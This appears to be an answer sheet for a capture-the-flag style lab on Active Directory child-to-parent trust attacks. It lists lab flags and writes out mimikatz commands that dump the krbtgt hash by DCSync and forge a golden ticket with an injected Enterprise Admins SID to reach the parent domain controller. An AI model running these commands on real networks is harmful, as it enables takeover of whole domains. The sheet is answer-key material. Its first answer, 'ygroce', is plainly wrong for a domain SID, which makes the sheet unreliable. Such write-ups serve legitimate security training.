# Section 28: Attacking Domain Trusts - Child -> Parent Trusts - from Windows

Module: 13. Active Directory Enumeration & Attacks

---

## Questions & Answers

### 1. What is the SID of the child domain?

Context:
```powershell

```

**Answer:** `ygroce`

---

### 2. What is the SID of the Enterprise Admins group in the root domain?

Context:
```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

S-1-5-21-3842939050-3880317879-2865463114-519
```

**Answer:** `S-1-5-21-3842939050-3880317879-2865463114-519`

---

### 3. Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain.

Context:
```powershell
.\mimikatz.exe
lsadump::dcsync /user:LOGISTICS\krbtgt
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
cat \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
```

**Answer:** `f@ll1ng_l1k3_d0m1no3$`

---

[Back to Module Index](./README.md)
